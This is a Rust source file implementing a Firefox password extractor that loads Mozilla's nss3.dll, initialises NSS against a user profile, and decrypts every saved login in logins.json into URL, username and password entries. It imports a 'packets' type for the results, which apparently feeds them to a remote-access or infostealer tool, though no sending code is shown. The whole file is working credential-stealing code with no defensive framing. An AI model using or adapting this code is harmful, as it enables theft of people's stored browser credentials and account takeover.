use std::path::Path;
use std::ffi::CString;
use common::packets::PasswordEntry;

// NSS FFI bindings for Firefox password decryption
// These functions are exported by nss3.dll

#[repr(C)]
struct SECItem {
    sec_item_type: u32,
    data: *mut u8,
    len: u32,
}

type NSSInitFunc = unsafe extern "C" fn(configdir: *const i8) -> i32;
type NSSShutdownFunc = unsafe extern "C" fn() -> i32;
type PK11SDRDecryptFunc = unsafe extern "C" fn(data: *const SECItem, result: *mut SECItem, cx: *mut std::ffi::c_void) -> i32;
type PORTFreeFunc = unsafe extern "C" fn(ptr: *mut std::ffi::c_void);

pub struct FirefoxPasswordExtractor {
    nss_initialized: bool,
    nss_lib: Option<libloading::Library>,
}

impl FirefoxPasswordExtractor {
    pub fn new() -> Self {
        Self {
            nss_initialized: false,
            nss_lib: None,
        }
    }

    pub fn init_nss(&mut self, profile_path: &Path) -> bool {
        if self.nss_initialized {
            return true;
        }

        // Find Firefox installation directory
        // nss3.dll is in the Firefox program directory, not the profile directory
        let firefox_install_dir = Self::find_firefox_install_dir();
        println!("[Firefox] Looking for nss3.dll in: {:?}", firefox_install_dir);

        let nss_path = firefox_install_dir.join("nss3.dll");
        if !nss_path.exists() {
            println!("[Firefox] nss3.dll not found at {:?}", nss_path);
            return false;
        }

        // CRITICAL: On Windows, we MUST change the current working directory to the
        // Firefox installation directory before loading nss3.dll. This is because
        // nss3.dll depends on other DLLs (mozglue.dll, msvcp140.dll, etc.) that are
        // located in the same directory. Windows searches for DLL dependencies in the
        // current working directory first. Without chdir, LoadLibraryExW fails to find
        // the dependent DLLs.
        // See: https://github.com/unode/firefox_decrypt/blob/main/firefox_decrypt.py
        let original_dir = match std::env::current_dir() {
            Ok(d) => d,
            Err(e) => {
                println!("[Firefox] Failed to get current directory: {}", e);
                return false;
            }
        };

        if let Err(e) = std::env::set_current_dir(&firefox_install_dir) {
            println!("[Firefox] Failed to chdir to {:?}: {}", firefox_install_dir, e);
            return false;
        }

        println!("[Firefox] Changed working directory to {:?}", firefox_install_dir);

        // Now load nss3.dll - dependent DLLs will be found in the current directory
        let nss_lib = match unsafe { libloading::Library::new("nss3.dll") } {
            Ok(lib) => {
                println!("[Firefox] Loaded nss3.dll successfully from {:?}", firefox_install_dir);
                lib
            }
            Err(e) => {
                println!("[Firefox] Failed to load nss3.dll from {:?}: {}", firefox_install_dir, e);
                // Restore original directory
                let _ = std::env::set_current_dir(&original_dir);
                return false;
            }
        };

        // Restore original working directory immediately after loading the library
        if let Err(e) = std::env::set_current_dir(&original_dir) {
            println!("[Firefox] Warning: failed to restore working directory: {}", e);
        }

        // Get required function pointers
        let nss_init: libloading::Symbol<NSSInitFunc> = match unsafe { nss_lib.get(b"NSS_Init") } {
            Ok(f) => f,
            Err(e) => {
                println!("[Firefox] Failed to get NSS_Init: {}", e);
                return false;
            }
        };

        // Convert path to C string with "sql:" prefix for compatibility with both
        // Berkeley DB (cert8) and SQLite (cert9) backends
        let profile_str = format!("sql:{}", profile_path.to_str().unwrap_or(""));
        let path_cstr = match CString::new(profile_str.as_str()) {
            Ok(s) => s,
            Err(e) => {
                println!("[Firefox] Invalid profile path: {}", e);
                return false;
            }
        };

        // Initialize NSS in read-only mode
        let result = unsafe { nss_init(path_cstr.as_ptr()) };
        if result == 0 {
            println!("[Firefox] NSS initialized successfully for {:?}", profile_path);
            self.nss_initialized = true;
            self.nss_lib = Some(nss_lib);
            true
        } else {
            println!("[Firefox] NSS_Init failed with code: {}", result);
            false
        }
    }

    fn find_firefox_install_dir() -> std::path::PathBuf {
        // Common Firefox installation paths
        let paths = [
            "C:\\Program Files\\Mozilla Firefox",
            "C:\\Program Files (x86)\\Mozilla Firefox",
        ];

        for path in &paths {
            let p = std::path::PathBuf::from(path);
            if p.join("nss3.dll").exists() {
                return p;
            }
        }

        // Try to find via registry
        if let Ok(key) = winreg::RegKey::predef(winreg::enums::HKEY_LOCAL_MACHINE)
            .open_subkey("SOFTWARE\\Mozilla\\Mozilla Firefox")
        {
            if let Ok(current_version) = key.get_value::<String, _>("CurrentVersion") {
                let main_key = format!("SOFTWARE\\Mozilla\\Mozilla Firefox\\{}\\Main", current_version);
                if let Ok(main) = winreg::RegKey::predef(winreg::enums::HKEY_LOCAL_MACHINE)
                    .open_subkey(&main_key)
                {
                    if let Ok(install_dir) = main.get_value::<String, _>("Install Directory") {
                        return std::path::PathBuf::from(install_dir);
                    }
                }
            }
        }

        // Fallback to default
        std::path::PathBuf::from("C:\\Program Files\\Mozilla Firefox")
    }

    pub fn decrypt_data(&self, encrypted_b64: &str) -> Option<String> {
        if !self.nss_initialized {
            return None;
        }

        let nss_lib = match &self.nss_lib {
            Some(lib) => lib,
            None => return None,
        };

        // Decode base64 encrypted data
        let encrypted_data = match base64::Engine::decode(&base64::engine::general_purpose::STANDARD, encrypted_b64) {
            Ok(d) => d,
            Err(e) => {
                println!("[Firefox] Failed to decode base64: {}", e);
                return None;
            }
        };

        // Create input SECItem
        let input = SECItem {
            sec_item_type: 0,
            data: encrypted_data.as_ptr() as *mut u8,
            len: encrypted_data.len() as u32,
        };

        // Create output SECItem (will be allocated by NSS)
        let mut output = SECItem {
            sec_item_type: 0,
            data: std::ptr::null_mut(),
            len: 0,
        };

        unsafe {
            let pk11_sdr_decrypt: libloading::Symbol<PK11SDRDecryptFunc> = match nss_lib.get(b"PK11SDR_Decrypt") {
                Ok(f) => f,
                Err(e) => {
                    println!("[Firefox] Failed to get PK11SDR_Decrypt: {}", e);
                    return None;
                }
            };

            let port_free: libloading::Symbol<PORTFreeFunc> = match nss_lib.get(b"PORT_Free") {
                Ok(f) => f,
                Err(e) => {
                    println!("[Firefox] Failed to get PORT_Free: {}", e);
                    return None;
                }
            };

            // Call PK11SDR_Decrypt
            let result = pk11_sdr_decrypt(&input, &mut output, std::ptr::null_mut());
            if result != 0 {
                println!("[Firefox] PK11SDR_Decrypt failed with code: {}", result);
                return None;
            }

            // Extract decrypted data
            if output.data.is_null() || output.len == 0 {
                println!("[Firefox] Decryption returned empty data");
                return None;
            }

            let decrypted = std::slice::from_raw_parts(output.data, output.len as usize).to_vec();
            
            // Free the allocated memory
            port_free(output.data as *mut std::ffi::c_void);

            // Convert to string
            String::from_utf8(decrypted).ok()
        }
    }

    pub fn shutdown_nss(&mut self) {
        if self.nss_initialized {
            if let Some(nss_lib) = &self.nss_lib {
                unsafe {
                    if let Ok(shutdown) = nss_lib.get::<NSSShutdownFunc>(b"NSS_Shutdown") {
                        let result = shutdown();
                        println!("[Firefox] NSS shutdown result: {}", result);
                    }
                }
            }
            self.nss_initialized = false;
            self.nss_lib = None;
        }
    }

    pub fn extract_passwords_from_logins(&self, profile_path: &Path) -> Vec<PasswordEntry> {
        let logins_path = profile_path.join("logins.json");
        if !logins_path.exists() {
            println!("[Firefox] logins.json not found at {:?}", logins_path);
            return Vec::new();
        }

        println!("[Firefox] Reading logins.json from {:?}", logins_path);
        
        // Read and parse logins.json
        let content = match std::fs::read_to_string(&logins_path) {
            Ok(c) => c,
            Err(e) => {
                println!("[Firefox] Failed to read logins.json: {}", e);
                return Vec::new();
            }
        };

        let json: serde_json::Value = match serde_json::from_str(&content) {
            Ok(j) => j,
            Err(e) => {
                println!("[Firefox] Failed to parse logins.json: {}", e);
                return Vec::new();
            }
        };

        let mut passwords = Vec::new();
        
        if let Some(logins) = json["logins"].as_array() {
            println!("[Firefox] Found {} login entries in logins.json", logins.len());
            
            for login in logins {
                let hostname = login["hostname"].as_str().unwrap_or("");
                let username_enc = login["encryptedUsername"].as_str().unwrap_or("");
                let password_enc = login["encryptedPassword"].as_str().unwrap_or("");

                if hostname.is_empty() || username_enc.is_empty() || password_enc.is_empty() {
                    continue;
                }

                // Try to decrypt username and password
                if let Some(decrypted_pass) = self.decrypt_data(password_enc) {
                    if let Some(decrypted_user) = self.decrypt_data(username_enc) {
                        passwords.push(PasswordEntry {
                            url: hostname.to_string(),
                            username: decrypted_user,
                            password: decrypted_pass,
                        });
                    }
                }
            }
        }

        println!("[Firefox] Extracted {} passwords from logins.json", passwords.len());
        passwords
    }
}
